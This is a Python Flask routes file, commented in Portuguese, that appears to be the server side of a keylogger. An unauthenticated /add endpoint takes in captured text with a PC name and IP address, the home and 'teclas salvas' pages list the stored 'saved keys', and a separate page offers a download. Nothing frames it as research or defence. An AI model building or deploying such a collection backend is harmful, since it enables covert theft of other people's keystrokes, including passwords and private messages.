from flask import render_template, request, jsonify
from app import app, db
from sqlalchemy import desc

from datetime import datetime

from app.models.tables import Save_keys
from app.controllers.respostas import resposta_cod_add
from app.controllers.texte_manager import limitar_texto


@app.route('/')
def home():
    saves = Save_keys.query.order_by(Save_keys.id.desc()).limit(5).all()
    
    for i in range(len(saves)):
        saves[i].texto = limitar_texto(saves[i].texto, 200)
        
    return render_template('home.html', saves=saves)


@app.route('/save/<id>')
def tsave(id):
    save = Save_keys.query.get(id)
    return render_template('save.html', save=save)


@app.route('/teclasalvas')
@app.route('/teclasalvas/page/<pg>')
def teclas_salvas(pg=1):
    QNT_VIS_PAGE = 5 #Quantidade de itens que seram visualizados em uma unica pagina
    
    pgmx = (int(pg)-1) * QNT_VIS_PAGE
    save = Save_keys.query.filter(Save_keys.id <= Save_keys.query.count() - pgmx).order_by(desc(Save_keys.id)).limit(QNT_VIS_PAGE)

    if int(pg) <= 1:
        beforepage = 1
    else:
        beforepage = int(pg) - 1

    if save.count() < QNT_VIS_PAGE:
        nextpage = int(pg)
    else:
        nextpage = int(pg) + 1

    saves = save.all()
    for i in range(len(saves)):
        saves[i].texto = limitar_texto(saves[i].texto, 600)
        
    return render_template('teclas-salvas.html', saves=saves, page=pg, nextpage=nextpage, beforepage=beforepage)


@app.route('/download')
def download():
    return render_template('download.html')

@app.route('/add', methods=['POST'])
def add():
    body = request.get_json()
    for p in ('pcname', 'texto'):
        if p not in body:
            return resposta_cod_add(cod=400, msg=f'O parametro [{p}] é obrigatorio! ')
    
    if 'criador' not in body:   
        body['criador'] = 'Anonymo'
    
    if 'ip' not in body:
        body['ip'] = None
    
    me = Save_keys(pcname=body['pcname'], texto=body['texto'], data=datetime.now(), criador=body['criador'], ip=body['ip'])
    db.session.add(me)
    db.session.commit()

    return resposta_cod_add(cod=200, msg='Cadastrado com Sucesso! ')

